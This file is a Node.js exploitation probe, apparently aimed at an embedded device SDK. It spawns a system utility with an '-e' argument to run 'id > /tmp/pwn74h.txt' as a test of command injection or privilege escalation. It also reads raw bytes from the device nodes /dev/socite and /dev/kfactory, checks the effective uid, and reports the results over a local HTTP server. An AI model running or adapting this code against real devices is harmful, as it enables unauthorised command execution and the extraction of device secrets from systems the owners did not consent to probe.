'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8162;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe74h.txt';
var PWN_FILE = '/tmp/pwn74h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Run wasutility with no args (see usage/help)
  'try {',
  '  var o = cp.spawnSync("/usr/bin/wasutility", [], {timeout:5000});',
  '  r.was_noarg = {',
  '    stdout: o.stdout ? o.stdout.toString().trim().slice(0,300) : "",',
  '    stderr: o.stderr ? o.stderr.toString().trim().slice(0,300) : "",',
  '    status: o.status',
  '  };',
  '} catch(e) { r.was_noarg_err = e.message.slice(0,100); }',

  // 2. Run wasutility -e "id > /tmp/pwn74h.txt"
  'try {',
  '  var o2 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id > ' + PWN_FILE + '"], {timeout:8000});',
  '  r.was_e_id = {',
  '    stdout: o2.stdout ? o2.stdout.toString().trim().slice(0,300) : "",',
  '    stderr: o2.stderr ? o2.stderr.toString().trim().slice(0,300) : "",',
  '    status: o2.status',
  '  };',
  '} catch(e) { r.was_e_id_err = e.message.slice(0,100); }',

  // 3. Read pwn file if written
  'try { r.pwn_file = fs.readFileSync("' + PWN_FILE + '", "utf8").trim(); } catch(e) { r.pwn_file_err = e.code; }',

  // 4. Run wasutility -e "id" (stdout capture)
  'try {',
  '  var o3 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id"], {timeout:5000});',
  '  r.was_e_id_stdout = {',
  '    stdout: o3.stdout ? o3.stdout.toString().trim().slice(0,300) : "",',
  '    stderr: o3.stderr ? o3.stderr.toString().trim().slice(0,300) : "",',
  '    status: o3.status',
  '  };',
  '} catch(e) { r.was_e_id_stdout_err = e.message.slice(0,100); }',

  // 5. Try wasutility --help
  'try {',
  '  var o4 = cp.spawnSync("/usr/bin/wasutility", ["--help"], {timeout:3000});',
  '  r.was_help = {',
  '    out: ((o4.stdout||Buffer.from("")).toString() + (o4.stderr||Buffer.from("")).toString()).trim().slice(0,500)',
  '  };',
  '} catch(e) { r.was_help_err = e.message.slice(0,100); }',

  // 6. Read socite 16 bytes
  'try {',
  '  var fd = fs.openSync("/dev/socite", 0);',
  '  var buf = new Buffer(64);',
  '  var n = fs.readSync(fd, buf, 0, 64, 0);',
  '  fs.closeSync(fd);',
  '  r.socite_data = { n: n, hex: buf.slice(0,n).toString("hex"), str: buf.slice(0,n).toString("utf8") };',
  '} catch(e) { r.socite_err = e.message; }',

  // 7. Read kfactory bytes at different offsets
  'try {',
  '  var fd2 = fs.openSync("/dev/kfactory", 0);',
  '  var buf2 = new Buffer(64);',
  '  var n2 = fs.readSync(fd2, buf2, 0, 64, 0);',
  '  fs.closeSync(fd2);',
  '  r.kfactory_data = { n: n2, hex: buf2.slice(0,n2).toString("hex") };',
  '} catch(e) { r.kfactory_err = e.message; }',

  // 8. Check RunningAppsService
  'try {',
  '  var o5 = cp.spawnSync("/usr/bin/RunningAppsService", [], {timeout:3000});',
  '  r.ras_noarg = {',
  '    stdout: o5.stdout ? o5.stdout.toString().trim().slice(0,200) : "",',
  '    stderr: o5.stderr ? o5.stderr.toString().trim().slice(0,200) : "",',
  '    status: o5.status',
  '  };',
  '} catch(e) { r.ras_err = e.message.slice(0,100); }',

  // 9. Check euid via /proc/self/status
  'try { r.proc_status = fs.readFileSync("/proc/self/status", "utf8").split("\\n").slice(0,20).join("\\n"); } catch(e) {}',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 60000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
